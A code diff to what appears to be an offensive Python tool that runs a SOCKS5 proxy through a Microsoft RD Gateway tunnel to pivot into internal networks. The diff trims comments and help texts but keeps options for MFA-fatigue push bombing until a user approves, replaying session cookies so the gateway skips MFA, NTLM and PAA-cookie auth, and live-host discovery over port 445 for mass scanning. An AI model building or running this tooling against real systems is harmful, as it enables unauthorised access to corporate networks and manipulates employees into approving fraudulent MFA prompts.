@@ -1635,18 +1419,10 @@ class WarmSocksServer(SocksServer):
                                     return
                                 if g is not None or len(snif) > 4096 or \
                                         time.monotonic() - snif_t0 > 4:
-                                    # answered, not the gateway => live host
                                     classified = True
                                     client.sendall(snif)
-                                # else: keep buffering (<92B so far)
                             elif (not life[0] and wrote[0] is not None and
                                   time.monotonic() - wrote[0] > STILLBORN_S):
-                                # GRANTED but silent: the wire matrix's
-                                # stillborn channel (refused port). It never
-                                # delivers and never acks a close — the
-                                # tunnel is spent. Cut the client loose,
-                                # remember the port, let the next connection
-                                # rebuild.
                                 self.stats["stillborn"] += 1
                                 t.closed = True
                                 try:
@@ -1660,17 +1436,11 @@ class WarmSocksServer(SocksServer):
                                     "discarded%s" %
                                     (conn_id, host, port, STILLBORN_S,
                                      cached))
-                                # shutdown (not rst): a concurrent writer
-                                # recv on this socket defers a linger-close's
-                                # RST — shutdown wakes it and EOFs the client
                                 try:
                                     client.shutdown(socket.SHUT_RDWR)
                                 except Exception:
                                     pass
                                 return
-                            # else: client hasn't written yet, or the target
-                            # is quiet mid-session — only the FIRST response
-                            # is covered by the stillborn window
                     except Exception as _re:
                         say("[conn %d] reader exit: %s" %
                             (conn_id, _re))
@@ -1681,13 +1451,8 @@ class WarmSocksServer(SocksServer):
 
                 rt = threading.Thread(target=reader, daemon=True)
                 rt.start()
-                client.settimeout(15)    # reader-stuck fix: sendall blocks
-                                         # forever when the SOCKS client
-                                         # disconnects mid-flow; 15s is
-                                         # generous for legit writes but
-                                         # well under the kernel's TCP
-                                         # retransmit timeout (~2min)
-                if sniff:                # the multi-dialect negotiate we held
+                client.settimeout(15)
+                if sniff:
                     wrote[0] = time.monotonic()
                     t.write(sniff)
                 try:
@@ -1719,11 +1484,6 @@ class WarmSocksServer(SocksServer):
                             (conn_id, len(d), _cmd))
                         t.write(d)
                 finally:
-                    # Race the target's close: fire CLOSE_CHANNEL(0)
-                    # immediately so the gateway tears down the channel
-                    # BEFORE the target's FIN/RST arrives. If we win,
-                    # the reader sees 0x11 and the tunnel survives; if
-                    # we lose, the reader sees 0x10/0x800759D8 instead.
                     preempt_sent = False
                     _t0 = time.monotonic()
                     if wrote[0] is None:
@@ -1890,8 +1650,7 @@ class WarmSocksServer(SocksServer):
         srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         srv.bind((self.args.socks_host, self.args.socks_port))
-        srv.listen(512)   # nxc /24 opens 256 threads; backlog 16 RSTs the
-                          # 17th SYN and nxc reports live hosts as down
+        srv.listen(512)
         print("[*] SOCKS5 %s:%d via %s:%d as %s" %
               (self.args.socks_host, self.args.socks_port, self.args.gateway,
                self.args.gport, self.args.ident_label), flush=True)
@@ -1988,21 +1747,14 @@ def parse_args(argv=None):
     ap.add_argument("--timeout", type=int, default=15,
                     help="TCP/TLS connect timeout (default: %(default)s)")
     ap.add_argument("--auth-timeout", type=int, default=60,
-                    help="tunnel-auth approval window in seconds — how long "
-                         "you have to approve an MFA push per connection "
-                         "(default: %(default)s)")
+                    help="MFA approval window in seconds (default: %(default)s)")
     ap.add_argument("--client-name", help="tunnel client name (default: hostname)")
     ap.add_argument("--ext-auth", choices=["none", "sspi_ntlm", "paa"],
                     default="none",
-                    help="MS-TSGU extended-auth mode: sspi_ntlm = NTLM tokens "
-                         "in tunnel packets (no HTTP auth); paa = PAA cookie "
-                         "auth (see --paa-cookie). Server-advertised modes "
-                         "appear in handshake logs with -v.")
+                    help="extended-auth mode (default: %(default)s)")
     ap.add_argument("--paa-cookie", help="PAA cookie string (with --ext-auth paa)")
     ap.add_argument("--bridge", type=int, metavar="PORT",
-                    help="single-tunnel bridge mode (with --target): pay ONE "
-                         "MFA, then bridge the channel to 127.0.0.1:PORT — "
-                         "pair with ssh -D for unlimited multiplexed use")
+                    help="bridge channel to local PORT (with --target)")
     ap.add_argument("--mfa-fatigue", action="store_true",
                     help="retry tunnel auth on a cadence; each attempt "
                          "triggers a fresh MFA push until approved")
@@ -2012,10 +1764,7 @@ def parse_args(argv=None):
                     help="+/- random seconds on the interval (default: %(default)s)")
     ap.add_argument("--no-gw-fallback", dest="gw_fallback",
                     action="store_false", default=True,
-                    help="disable the 445 gateway-loopback fallback (with it, "
-                         "every 445 channel is created as [target,127.0.0.1] "
-                         "so dead hosts can never deny the create and cost a "
-                         "push; the SMB ServerGUID tells dead from alive)")
+                    help="disable 445 gateway-loopback fallback")
     ap.add_argument("--mfa-max", type=int, default=0,
                     help="stop after N pushes, 0 = unlimited (default: %(default)s)")
     ap.add_argument("--mfa-auth-timeout", type=int, default=65,
@@ -2023,15 +1772,10 @@ def parse_args(argv=None):
                          "(default: %(default)s)")
     ap.add_argument("--no-scout", dest="no_scout", action="store_true",
                     default=False,
-                    help="disable the scout tunnel — unknown host:port pairs "
-                         "go directly to the warm tunnel (less resilient, "
-                         "legacy single-tunnel behavior)")
+                    help="disable scout tunnel (single-tunnel mode)")
     ap.add_argument("--no-session-reuse", dest="session_reuse",
                     action="store_false", default=True,
-                    help="disable session/cookie reuse across tunnel rebuilds "
-                         "(by default, cookies and connection IDs from the "
-                         "first MFA-approved tunnel are replayed on rebuilds "
-                         "so the gateway may skip re-prompting MFA)")
+                    help="disable cookie/session reuse across tunnel rebuilds")
     ap.add_argument("-v", "--verbose", action="store_true")
     args = ap.parse_args(argv)
 
@@ -2090,10 +1834,7 @@ def main(argv=None):
         except MfaNotApproved as e:
             print("[-] %s" % e, file=sys.stderr)
             if not args.mfa_fatigue:
-                print("[!] MFA push timed out or was denied — consider using "
-                      "the --mfa-fatigue options to convince the user to "
-                      "play along (pushes repeat until approved)",
-                      file=sys.stderr)
+                print("[!] try --mfa-fatigue", file=sys.stderr)
             return 2
         except RDGError as e:
             print("[-] %s" % e, file=sys.stderr)
